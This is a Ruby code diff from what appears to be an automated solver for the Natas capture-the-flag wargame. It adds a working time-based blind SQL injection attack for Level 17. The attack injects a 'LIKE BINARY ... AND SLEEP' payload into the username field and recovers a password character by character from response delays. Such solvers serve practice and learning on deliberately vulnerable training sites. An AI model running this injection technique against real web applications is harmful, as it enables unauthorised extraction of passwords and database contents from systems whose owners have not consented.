@@ -493,6 +493,7 @@ class NatasLevel15 < NatasLevelBase
       end
     end
 
+    not_found if password.length != PASSWORD_LENGTH
     found(password)
   end
 end
@@ -517,4 +518,39 @@ end
 # Level 17
 class NatasLevel17 < NatasLevelBase
   LEVEL = 17
+  PAGE = '/'
+  INTERVAL = 5
+  DICT =
+    ('a'..'z').to_a +
+    ('A'..'Z').to_a +
+    ('0'..'9').to_a
+
+  def exec
+    password = String.new
+    log('Bruteforcing password')
+    PASSWORD_LENGTH.times do
+      DICT.each do |c|
+        payload = %(natas18" AND password LIKE BINARY "#{password}#{c}%" AND SLEEP(#{INTERVAL}) #)
+        time = Time.now
+        post(
+          PAGE,
+          {},
+          { 'username' => payload }
+        )
+        if Time.now - time >= INTERVAL
+          log(password << c)
+          break
+        end
+      end
+    end
+
+    not_found if password.length != PASSWORD_LENGTH
+    found(password)
+  end
+end
+
+##
+# Level 18
+class NatasLevel18 < NatasLevelBase
+  LEVEL = 18
 end
